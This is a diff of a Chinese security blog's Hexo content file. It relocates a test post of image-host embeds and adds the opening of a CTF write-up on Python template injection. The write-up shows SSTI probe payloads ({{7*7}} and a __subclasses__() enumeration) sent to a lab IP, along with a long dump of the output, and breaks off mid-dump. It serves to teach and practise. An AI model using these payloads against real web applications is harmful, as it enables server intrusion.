-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>此次实验使用了河马这款Webshell扫描工具对常见的PHP木马进行查杀，了解了这款扫描工具的使用</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Webshell扫描</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>关于建站</title>
     <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
     <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
@@ -2269,35 +2269,6 @@
       <tags>
         <tag>建站</tag>
         <tag>图床</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客内容测试</title>
-    <url>/2023/10/29/%E5%8D%9A%E5%AE%A2%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<p><img data-src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
-<p><img data-src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
-<p><img data-src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
-<p><img data-src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
-<p><img data-src="https://pub-22835847b5fc4ff29c6576c8772eea65.r2.dev/202311051019789.jpg" alt="cloudflare R2"></p>
-<p><img data-src="https://pub-22835847b5fc4ff29c6576c8772eea65.r2.dev/202311051020956.png" alt="cloudflare R2"></p>
-<p><img data-src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
-<p><img data-src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
-<p><img data-src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
-<p>视频插入测试，代码为：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; width: 100%; </span></span></span><br><span class="line"><span class="string"><span class="tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
-src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
-frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
-height: 100%; left: 0; top: 0;"> </iframe></div>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>picture</tag>
       </tags>
   </entry>
   <entry>
@@ -2417,6 +2388,172 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       <tags>
         <tag>CTF</tag>
         <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客内容测试</title>
+    <url>/2023/10/29/%E5%8D%9A%E5%AE%A2%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p><img data-src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
+<p><img data-src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
+<p><img data-src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
+<p><img data-src="https://img.gaifagafin.top/202311041048278.jpg" alt="backbazeb2"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
+<p><img data-src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
+<p><img data-src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
+<p><img data-src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
+<p>视频插入测试，代码为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; width: 100%; </span></span></span><br><span class="line"><span class="string"><span class="tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
+src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
+frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
+height: 100%; left: 0; top: 0;"> </iframe></div>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>picture</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-Web_python_template_injection</title>
+    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
+    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
+<img data-src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
+
+<p>进入靶机网址提示</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">python <span class="keyword">template</span> injection</span><br></pre></td></tr></table></figure>
+
+<p>知道这是一道python模板注入</p>
+<p>url输入 </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/49 not found</span><br></pre></td></tr></table></figure>
+
+<p>判断存在SSTI注入</p>
+<p>查看网站模块，url输入</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">URL http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">50859</span>/[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span 